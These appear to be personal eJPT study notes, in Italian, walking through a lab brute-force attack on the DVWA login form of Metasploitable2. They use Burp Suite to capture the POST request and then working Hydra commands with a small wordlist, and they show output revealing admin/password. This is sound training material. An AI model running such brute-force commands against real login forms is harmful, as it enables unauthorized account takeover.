# Web Login Brute Force - DVWA with Hydra

Appunti personali sul brute force controllato di un form login web nel laboratorio eJPT.

> Tutte le attività sono svolte esclusivamente in ambiente locale autorizzato.

---

## 1. Obiettivo

Allenare un attacco di login brute force contro un form web vulnerabile in ambiente controllato.

Obiettivo eJPT coperto:

```text
Conduct web application login brute-force attack
```

---

## 2. Target

```text
Target: Metasploitable2
IP: 192.168.1.100
Applicazione: DVWA
Pagina login: /dvwa/login.php
URL: http://192.168.1.100/dvwa/login.php
Username noto: admin
Password corretta: password
```

---

## 3. Verifica applicazione

Da Kali:

```bash
curl -I http://192.168.1.100/dvwa/login.php
```

Obiettivo:

```text
Verificare che la pagina di login DVWA sia raggiungibile.
```

---

## 4. Ruolo di Burp Suite

In questo esercizio Burp Suite non viene usato per fare direttamente il brute force.

Burp serve per osservare la richiesta HTTP reale generata dal browser quando viene inviato il form di login DVWA.

Schema:

```text
Browser Burp
    ↓
Invio login DVWA
    ↓
Burp intercetta/mostra la richiesta HTTP
    ↓
Si identificano URL, metodo e parametri
    ↓
Hydra usa quei parametri per provare password dalla wordlist
```

Concetto importante:

```text
Browser = parte visiva del sito
Burp = parte tecnica della richiesta HTTP
Hydra = strumento che automatizza i tentativi di login
```

---

## 5. Apertura DVWA con Burp

Avviare Burp Suite:

```bash
burpsuite
```

Dentro Burp:

```text
Proxy → Intercept → Open browser
```

Nel browser interno di Burp aprire:

```text
http://192.168.1.100/dvwa/login.php
```

Nota:

```text
È importante usare il browser interno di Burp, non un browser esterno normale.
Il browser interno è già configurato per passare dal proxy di Burp.
```

---

## 6. Intercept OFF

Durante la navigazione iniziale, lasciare:

```text
Intercept is off
```

Percorso:

```text
Proxy → Intercept
```

Motivo:

```text
Con Intercept OFF il browser naviga normalmente.
Le richieste vengono comunque salvate in HTTP history.
```

---

## 7. Login di prova

Nel form DVWA eseguire un login di prova.

Login corretto noto:

```text
Username: admin
Password: password
```

Login sbagliato usato per confronto:

```text
Username: admin
Password: admin
```

---

## 8. HTTP history

Dopo aver inviato il form, andare in:

```text
Proxy → HTTP history
```

Cercare la richiesta importante:

```text
POST /dvwa/login.php
```

Nota:

```text
La richiesta importante è POST, non GET.
GET serve per caricare la pagina.
POST serve per inviare username e password al server.
```

---

## 9. Richiesta HTTP osservata

Con Burp Suite è stata intercettata la richiesta di login verso DVWA.

Richiesta osservata:

```http
POST /dvwa/login.php HTTP/1.1
Host: 192.168.1.100
Content-Type: application/x-www-form-urlencoded
Cookie: security=high; PHPSESSID=3a4054ea5fa767697c05a3f525e04501

username=admin&password=password&Login=Login
```

Parametri del form:

```text
username
password
Login
```

Interpretazione:

```text
Il form usa metodo POST.
Il campo username riceve l’utente.
Il campo password riceve la password.
Il parametro Login viene inviato insieme alla richiesta.
```

---

## 10. Send to Repeater

Dalla richiesta:

```text
POST /dvwa/login.php
```

fare:

```text
Tasto destro → Send to Repeater
```

Oppure usare la scorciatoia:

```text
CTRL + R
```

Poi andare nella scheda:

```text
Repeater
```

In Repeater è possibile modificare manualmente la richiesta e premere:

```text
Send
```

per vedere la risposta del server.

---

## 11. Test con password corretta

Nel body della richiesta:

```text
username=admin&password=password&Login=Login
```

Premere:

```text
Send
```

Risposta osservata:

```text
Location: index.php
```

Interpretazione:

```text
admin / password = login valido
```

Quindi:

```text
Password corretta → Location: index.php
```

---

## 12. Test con password sbagliata

Nel body della richiesta cambiare la password:

```text
username=admin&password=admin&Login=Login
```

Premere:

```text
Send
```

Risposta osservata:

```text
Location: login.php
```

Interpretazione:

```text
admin / admin = login fallito
```

Quindi:

```text
Password sbagliata → Location: login.php
```

---

## 13. Regola usata da Hydra

Burp ha permesso di capire la differenza tra login riuscito e login fallito:

```text
Password corretta  → Location: index.php
Password sbagliata → Location: login.php
```

Hydra userà questa informazione.

Nel comando Hydra viene indicata la stringa:

```text
login.php
```

per riconoscere il login fallito.

Se Hydra vede `login.php` nella risposta, considera la password sbagliata.

Se non vede più quella condizione di fallimento, segnala una credenziale valida.

---

## 14. Wordlist usata

È stata creata una piccola wordlist controllata:

```bash
cat > dvwa-passwords.txt << EOF
admin
test
123456
password
qwerty
EOF
```

Verifica:

```bash
cat dvwa-passwords.txt
```

Output:

```text
admin
test
123456
password
qwerty
```

---

## 15. Problema iniziale con Hydra

Inizialmente è stato provato il modulo:

```bash
http-post-form
```

Esempio:

```bash
hydra -l admin -P dvwa-passwords.txt 192.168.1.100 http-post-form '/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:F=login.php:H=Cookie\: security=high; PHPSESSID=3a4054ea5fa767697c05a3f525e04501' -V -f
```

Errore ottenuto:

```text
[ERROR] no valid optional parameter type given: F
```

Interpretazione:

```text
In questa versione/uso di Hydra, il modulo http-post-form non interpretava correttamente i parametri F= e S=.
La soluzione è stata usare il modulo corretto/classico http-form-post.
```

---

## 16. Comando Hydra funzionante

Comando corretto:

```bash
hydra -l admin -P dvwa-passwords.txt 192.168.1.100 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php" -V -f
```

---

## 17. Spiegazione comando Hydra

```text
-l admin
```

Usa un username singolo: `admin`.

```text
-P dvwa-passwords.txt
```

Usa la wordlist password `dvwa-passwords.txt`.

```text
192.168.1.100
```

Indirizzo IP del target.

```text
http-form-post
```

Modulo Hydra per form HTTP POST.

```text
/dvwa/login.php
```

Percorso del form di login.

```text
username=^USER^&password=^PASS^&Login=Login
```

Body POST inviato da Hydra.

Hydra sostituisce:

```text
^USER^ → admin
^PASS^ → ogni password della wordlist
```

```text
login.php
```

Stringa usata per riconoscere un login fallito.

```text
-V
```

Mostra i tentativi.

```text
-f
```

Ferma Hydra quando trova una password valida.

---

## 18. Output Hydra

Output importante:

```text
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "admin"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "test"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "123456"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "password"
[ATTEMPT] target 192.168.1.100 - login "admin" - pass "qwerty"
```

Risultato positivo:

```text
[80][http-post-form] host: 192.168.1.100   login: admin   password: password
1 of 1 target successfully completed, 1 valid password found
```

Nota:

```text
Anche se l’output mostra http-post-form nella riga del risultato,
il comando funzionante usato è stato http-form-post.
```

---

## 19. Risultato finale

Credenziali trovate:

```text
Username: admin
Password: password
```

Interpretazione:

```text
Hydra ha identificato correttamente la password valida del form login DVWA.
```

---

## 20. Catena completa

```text
Avvio Burp Suite
↓
Apertura browser interno di Burp
↓
Apertura DVWA login
↓
Invio login di prova
↓
HTTP history
↓
Identificazione richiesta POST /dvwa/login.php
↓
Send to Repeater
↓
Test password corretta: Location index.php
↓
Test password sbagliata: Location login.php
↓
Identificazione parametri username/password/Login
↓
Creazione wordlist controllata
↓
Tentativo iniziale con modulo errato/non compatibile
↓
Correzione usando http-form-post
↓
Hydra trova admin/password
↓
Web login brute force riuscito
```

---

## 21. Comandi rapidi

Verifica applicazione:

```bash
curl -I http://192.168.1.100/dvwa/login.php
```

Creazione wordlist:

```bash
cat > dvwa-passwords.txt << EOF
admin
test
123456
password
qwerty
EOF
```

Brute force web login DVWA:

```bash
hydra -l admin -P dvwa-passwords.txt 192.168.1.100 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php" -V -f
```

---

## 22. Errori comuni

### Modulo Hydra errato

Errore:

```text
[ERROR] no valid optional parameter type given: F
```

Causa:

```text
Uso problematico di http-post-form con parametri F= o S=.
```

Soluzione:

```bash
hydra -l admin -P dvwa-passwords.txt 192.168.1.100 http-form-post "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:login.php" -V -f
```

---

### Confusione tra GET e POST

Errore concettuale:

```text
Guardare solo GET /dvwa/login.php
```

Correzione:

```text
La richiesta importante è POST /dvwa/login.php.
Il POST contiene username e password.
```

---

### Confusione tra browser e Burp

Chiarimento:

```text
Il browser mostra il sito.
Burp mostra la richiesta HTTP.
Repeater permette di modificare e reinviare la stessa richiesta.
```

---

### Cookie/sessione DVWA

In alcuni casi il form può richiedere un cookie valido.

Esempio header osservato:

```text
Cookie: security=high; PHPSESSID=3a4054ea5fa767697c05a3f525e04501
```

Nel test finale, Hydra ha funzionato anche senza specificare manualmente il cookie.

---

## 23. Collegamento con eJPT

Questa esercitazione copre:

```text
Web application reconnaissance
Identificazione parametri di un form login
Uso di Burp Suite per osservare richieste POST
Uso di Repeater per confrontare risposte
Creazione wordlist
Brute force controllato di login web
Verifica credenziali valide
```

Obiettivo specifico:

```text
Conduct web application login brute-force attack
```

---

## 24. Lezioni apprese

```text
Prima bisogna capire come funziona il form.
Burp aiuta a identificare metodo, URL e parametri.
HTTP history mostra le richieste fatte dal browser.
La richiesta importante è POST /dvwa/login.php.
Repeater permette di modificare username/password e osservare la risposta.
Password corretta e sbagliata producono redirect diversi.
Location index.php indica login valido.
Location login.php indica login fallito.
Hydra richiede la sintassi corretta del modulo.
http-form-post ha funzionato correttamente sul form DVWA.
La stringa di fallimento permette a Hydra di distinguere password errata da password valida.
La password admin/password è stata trovata nella wordlist.
```

---

## 25. Nota etica

Questo test è stato svolto solo su DVWA in Metasploitable2, ambiente locale autorizzato.

Non usare Hydra o tecniche di brute force contro applicazioni reali senza autorizzazione esplicita.
